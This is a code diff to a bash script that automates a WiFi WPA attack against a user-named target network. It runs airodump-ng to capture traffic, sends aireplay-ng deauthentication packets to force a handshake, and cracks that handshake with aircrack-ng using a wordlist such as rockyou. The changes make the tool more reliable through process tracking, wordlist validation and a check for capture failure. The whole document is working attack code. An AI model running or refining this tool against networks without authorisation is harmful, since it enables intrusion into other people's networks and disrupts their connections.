@@ -33,15 +33,24 @@ function wifi_data(){
 		read -n 1 -t 0.1 key && break
 	done
 	xterm -hold -e "airodump-ng $moninterface" &
+	scanner_pid=$!
 	echo -ne "\nSpecify the ESSID (name) of the target network exactly: " && read -r victim_essid
 	echo -ne "\nMAC address of the target network: " && read -r victim_mac
 	echo -ne "\nChannel of the target network: " && read -r victim_channel
-	echo -ne "\nSpecify a wordlist to crack the password (rockyou by default): " && read -r wordlist
-	if [ "$wordlist" == "" ]; then
-		wordlist=$(locate rockyou.txt | grep -v .gz | head -n 1)
-	fi
-	pid=$(ps | grep xterm | awk '{print $1}')
-	kill $pid > /dev/null 2>&1
+	wordlist=""
+	while [ -z "$wordlist" ]; do
+		echo -ne "\nSpecify a wordlist to crack the password (rockyou by default): " && read -r wordlist
+		if [ "$wordlist" == "" ]; then
+			wordlist=$(locate rockyou.txt 2>/dev/null | grep -v '\.gz' | head -n 1)
+		fi
+		if [ -n "$wordlist" ] && [ -f "$wordlist" ]; then
+			break
+		fi
+		echo -e "\nWordlist $wordlist not found, try again"
+		wordlist=""
+	done
+	kill $scanner_pid > /dev/null 2>&1
+	pkill -P $scanner_pid > /dev/null 2>&1
 	sleep 2
 
 }
@@ -56,12 +65,22 @@ function password_attack(){
 	done
 	echo -e ". . . . Capturing the handshake"
 	xterm -hold -e "airodump-ng --essid $victim_essid -c $victim_channel --write data/handshake $moninterface 2>/dev/null || airodump-ng --bssid $victim_mac -c $victim_channel --write data/handshake $moninterface" &
+	capture_pid=$!
 	sleep 3
 	echo -e ". . . . Sending deauthentication packets"
 	aireplay-ng --deauth 10 -a $victim_mac $moninterface > /dev/null 2>&1
 	sleep 5
-	pid=$(ps | grep xterm | awk '{print $1}')
-	kill $pid > /dev/null 2>&1
+	kill $capture_pid > /dev/null 2>&1
+	pkill -P $capture_pid > /dev/null 2>&1
+
+	handshake_files=$(ls data/handshake*.cap 2>/dev/null | wc -l)
+	if [ "$handshake_files" -eq 0 ]; then
+		echo -e "\nNo capture was saved, the handshake could not be obtained"
+		echo -e "Interfaces will be restored and the script will exit\n"
+		sleep 3
+		ctrl_c
+	fi
+
 	echo -e ". . . . Cracking the handshake, this may take a while"
 	sleep 3
 	xterm -hold -e "aircrack-ng data/handshake*.cap -w $wordlist -l password.txt; sleep 3; exit"
